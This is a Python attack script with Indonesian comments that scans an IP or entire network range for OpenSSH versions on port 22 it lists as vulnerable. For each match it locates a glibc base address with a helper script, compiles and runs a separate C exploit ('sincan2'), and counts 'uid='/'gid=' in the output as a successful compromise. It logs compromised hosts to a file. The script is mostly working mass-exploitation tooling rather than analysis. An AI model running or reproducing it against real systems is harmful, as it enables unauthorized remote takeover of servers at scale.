#!/usr/bin/env python3

import subprocess
import sys
import os
import ipaddress
import re
import time
import threading

# ANSI color codes
GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
BLUE = "\033[94m"
RESET = "\033[0m"

VULNERABLE_VERSIONS = [
    'OpenSSH_8.5', 'OpenSSH_8.6', 'OpenSSH_8.7', 'OpenSSH_8.8',
    'OpenSSH_8.9', 'OpenSSH_9.0', 'OpenSSH_9.1', 'OpenSSH_9.2',
    'OpenSSH_9.3', 'OpenSSH_9.4', 'OpenSSH_9.5', 'OpenSSH_9.6',
    'OpenSSH_9.7', 'SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.10',
    'SSH-2.0-OpenSSH_9.3p1 Ubuntu-3ubuntu3.6',
    'SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.3',
    'SSH-2.0-OpenSSH_9.2p1 Debian-2+deb12u3',
    'SSH-2.0-OpenSSH_8.4p1 Debian-5+deb11u3'
]

class ProgressIndicator:
    def __init__(self, message="", timeout=30): # Timeout default dipersingkat
        self._message = message
        self._timeout = timeout
        self._thread = threading.Thread(target=self._draw_bar)
        self._stop_event = threading.Event()
        self.start_time = 0

    def _draw_bar(self):
        bar_width = 30
        while not self._stop_event.is_set():
            elapsed = time.time() - self.start_time
            remaining = self._timeout - elapsed
            
            if remaining < 0:
                remaining = 0
            
            percentage_remaining = (remaining / self._timeout) * 100
            filled_length = int(bar_width * percentage_remaining / 100)
            
            bar = '█' * filled_length + '-' * (bar_width - filled_length)
            
            mins, secs = divmod(int(remaining), 60)
            timer_str = f"Sisa waktu: {mins:02d}:{secs:02d}"
            
            sys.stdout.write(f"\r{self._message} [{GREEN}{bar}{RESET}] {YELLOW}{timer_str}{RESET}")
            sys.stdout.flush()
            
            if remaining <= 0:
                break
            
            time.sleep(1)

    def start(self):
        self.start_time = time.time()
        self._thread.start()

    def stop(self):
        self._stop_event.set()
        self._thread.join()
        sys.stdout.write("\r" + " " * (len(self._message) + 50) + "\r")
        sys.stdout.flush()

def find_vulnerable_ssh_services(target_ip):
    """
    Memindai HANYA PORT 22 menggunakan nmap -sV dan menampilkan bar hitung mundur.
    """
    nmap_timeout = 30  # MODIFIKASI: Timeout dipersingkat karena hanya scan 1 port
    message = f"{BLUE}[*] Menjalankan Nmap Service Scan pada {target_ip}:22...{RESET}"
    
    progress = ProgressIndicator(message, timeout=nmap_timeout)
    
    found_vulnerable_services = []
    try:
        # MODIFIKASI: Perintah nmap diubah untuk hanya memindai port 22
        command = ["nmap", "-sV", "-p", "22", "-Pn", "-T4", "--open", target_ip]
        
        progress.start()
        result = subprocess.run(command, capture_output=True, text=True, timeout=nmap_timeout)
        progress.stop()

        service_matches = re.findall(r"(\d+)/tcp\s+open\s+ssh\s+(.*)", result.stdout)
        
        if not service_matches:
            print(f"{RED}[-] Port 22 tidak terbuka atau bukan layanan SSH.{RESET}")
            return []

        print(f"{GREEN}[+] Nmap selesai. Ditemukan {len(service_matches)} layanan SSH. Memverifikasi versi...{RESET}")
        for port, banner in service_matches:
            banner = banner.strip()
            print(f"    - Port {port}: {banner}", end='')
            is_vulnerable = False
            for vulnerable_string in VULNERABLE_VERSIONS:
                if vulnerable_string in banner:
                    is_vulnerable = True
                    break
            
            if is_vulnerable:
                print(f" {GREEN}(RENTAN){RESET}")
                found_vulnerable_services.append((int(port), banner))
            else:
                print(f" {YELLOW}(TIDAK RENTAN){RESET}")

        return found_vulnerable_services
        
    except FileNotFoundError:
        progress.stop()
        print(f"\n{RED}[!] Perintah 'nmap' tidak ditemukan. Pastikan nmap sudah terpasang.{RESET}")
        sys.exit(1)
    except subprocess.TimeoutExpired:
        progress.stop()
        print(f"\n{RED}Nmap timeout setelah {nmap_timeout} detik saat memindai {target_ip}:22{RESET}")
        return []
    except Exception as e:
        progress.stop()
        print(f"\n{RED}Error saat menjalankan nmap: {e}{RESET}")
        return []

def compile_exploit(c_file="sincan2.c", out_file="sincan2"):
    print(f"{BLUE}[*] Mengompilasi '{c_file}'...{RESET}")
    result = subprocess.run(["gcc", c_file, "-o", out_file, "-pthread"], capture_output=True, text=True)
    if result.returncode != 0:
        print(f"{RED}[!] Gagal mengompilasi {c_file}\n{result.stderr}{RESET}")
        return False
    print(f"{GREEN}[✓] Kompilasi berhasil.{RESET}")
    return True

def find_glibc_base(target_ip, port):
    print(f"{BLUE}    [*] Menjalankan pemindai 'mencari.py' untuk port {port}...{RESET}")
    try:
        result = subprocess.run(
            ["python3", "mencari.py", target_ip, "--port", str(port)],
            stdout=subprocess.PIPE, text=True, check=True, timeout=300
        )
        glibc_base = result.stdout.strip()
        return glibc_base if glibc_base and glibc_base.startswith("0x") else None
    except (FileNotFoundError, subprocess.CalledProcessError, subprocess.TimeoutExpired):
        return None

def run_exploit(target_ip, port, glibc_base):
    print(f"{BLUE}    [*] Menjalankan eksploit './sincan2' pada {target_ip}:{port}...{RESET}")
    try:
        env = os.environ.copy()
        env["GLIBC_BASE"] = glibc_base
        result = subprocess.run(["./sincan2", target_ip, str(port)], env=env, capture_output=True, text=True, timeout=120)
        
        if "uid=" in result.stdout and "gid=" in result.stdout:
            print(f"{GREEN}[✓] EKSPLOIT BERHASIL pada {target_ip}:{port}!{RESET}")
            print(result.stdout)
            with open(f"{target_ip}_{port}.txt", "w") as f_out:
                f_out.write(result.stdout)
            print(f"{GREEN}[✓] Output detail disimpan ke '{target_ip}_{port}.txt'{RESET}")
            with open("target.txt", "a") as f_log:
                f_log.write(f"{target_ip}:{port}\n")
            print(f"{GREEN}[✓] Target {target_ip}:{port} disimpan ke 'target.txt'{RESET}")
            return True
        else:
            print(f"{RED}[!] Eksploit pada port {port} selesai, tapi output tidak terlihat seperti hasil yang diharapkan.{RESET}")
    except (FileNotFoundError, subprocess.TimeoutExpired) as e:
        print(f"{RED}[!] Gagal menjalankan sincan2: {e}{RESET}")
    return False

def main():
    if len(sys.argv) != 2:
        print(f"Penggunaan: {sys.argv[0]} <target_ip | network_cidr>")
        sys.exit(1)

    target_input = sys.argv[1]
    
    try:
        targets_to_scan = [str(ip) for ip in ipaddress.ip_network(target_input, strict=False).hosts()] if '/' in target_input else [ipaddress.ip_address(target_input) and target_input]
    except ValueError:
        print(f"{RED}[!] Format IP atau CIDR tidak valid: {target_input}{RESET}")
        sys.exit(1)

    print(f"{BLUE}[*] Menyiapkan pemindaian untuk {len(targets_to_scan)} host (hanya port 22)...{RESET}")
    exploit_compiled = False

    for i, target_ip in enumerate(targets_to_scan):
        print("\n" + "="*60)
        print(f"{YELLOW}[*] MEMPROSES TARGET {i+1}/{len(targets_to_scan)}: {target_ip}{RESET}")
        print("="*60)
        
        vulnerable_services = find_vulnerable_ssh_services(target_ip)
        
        if not vulnerable_services:
            print(f"{YELLOW}[-] Target tidak memiliki layanan SSH rentan di port 22. Lanjut ke target berikutnya.{RESET}")
            continue
        
        host_compromised = False
        
        for port, banner in vulnerable_services:
            print(f"\n{BLUE}  --- Mencoba eksploitasi pada Port {port} ({banner}) ---{RESET}")
            
            glibc_base = find_glibc_base(target_ip, port)
            
            if glibc_base:
                if not exploit_compiled:
                    if not compile_exploit():
                        print(f"{RED}[!] Kompilasi gagal. Menghentikan semua proses.{RESET}")
                        sys.exit(1)
                    exploit_compiled = True
                
                if run_exploit(target_ip, port, glibc_base):
                    host_compromised = True
                    # Karena hanya scan 1 port, kita bisa langsung lanjut ke IP berikutnya
                    break
            else:
                print(f"{YELLOW}    [-] Gagal menemukan GLIBC base pada {target_ip}:{port}.{RESET}")
        
        if host_compromised:
            continue

    print(f"\n{GREEN}[✓] Selesai memproses semua target.{RESET}")

if __name__ == "__main__":
    main()
